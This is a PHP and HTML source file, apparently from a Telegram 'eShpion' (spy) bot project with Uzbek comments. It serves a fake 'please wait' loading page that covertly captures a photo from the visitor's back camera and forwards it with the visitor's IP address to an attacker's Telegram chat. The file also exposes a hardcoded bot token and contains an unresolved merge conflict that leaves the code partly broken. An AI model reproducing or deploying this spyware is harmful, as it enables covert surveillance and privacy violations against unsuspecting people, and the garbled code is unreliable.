<?php
// Xatolarni ko'rsatish
error_reporting(E_ALL);
ini_set('display_errors', 0);

// ---------------- SOZLAMALAR ----------------
<<<<<<< HEAD
$bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
=======
$bot_token = 8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4E";
>>>>>>> 986a4aa54d157ecbc5d11f09786731e3683fb311
$log_file = "debug_log.txt";
// --------------------------------------------

function writeLog($text) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " | BACK_CAMERA | " . $text . "\n", FILE_APPEND);
}

// User ID ni olish
$user_id = $_GET['id'] ?? '';
if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}

// POST so'rov kelganda (Rasm yuborilganda)
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    $photo = $_FILES['photo'];
    
    writeLog("Rasm keldi. Hajmi: " . round($photo['size']/1024) . " KB");

    // Caption o'zgartirildi: ORQA KAMERA
    $caption = "📸 <b>ORQA KAMERA RASMI QABUL QILINDI</b>\n\n👤 ID: <code>$user_id</code>\n🌐 IP: $ip\n📅 " . date('d.m.Y H:i:s');
    
    $ch = curl_init("https://api.telegram.org/bot{$bot_token}/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $user_id,
            'photo' => new CURLFile($photo['tmp_name'], $photo['type'], 'back_camera.jpg'),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ]
    ]);
    
    $res = curl_exec($ch);
    writeLog("Telegram javobi: " . $res);
    curl_close($ch);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Yuklanmoqda...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #666; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div>Iltimos, kuting...</div>
    </div>

    <script>
    (async function(){
        const redirectUrl = "https://t.me/eShpionBot?start=true";

        try {
            // facingMode: 'environment' -> Bu aynan ORQA kamera degani
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'environment',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 } 
                }, 
                audio: false 
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.muted = true;
            await video.play();

            // Kamera fokusni va yorug'likni to'g'irlashi uchun 2.5 soniya kutamiz
            await new Promise(r => setTimeout(r, 2500));

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Streamni o'chirish (batareya va resursni tejash uchun)
            stream.getTracks().forEach(t => t.stop());

            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('photo', blob, 'back_camera.jpg');

                try {
                    await fetch(window.location.href, { 
                        method: 'POST', 
                        body: fd 
                    });
                } catch (err) {
                    console.error("Yuborishda xato:", err);
                } finally {
                    window.location.href = redirectUrl;
                }
            }, 'image/jpeg', 0.85);

        } catch (e) {
            console.error("Kamera xatosi:", e);
            window.location.href = redirectUrl;
        }
    })();
    </script>
</body>
</html>
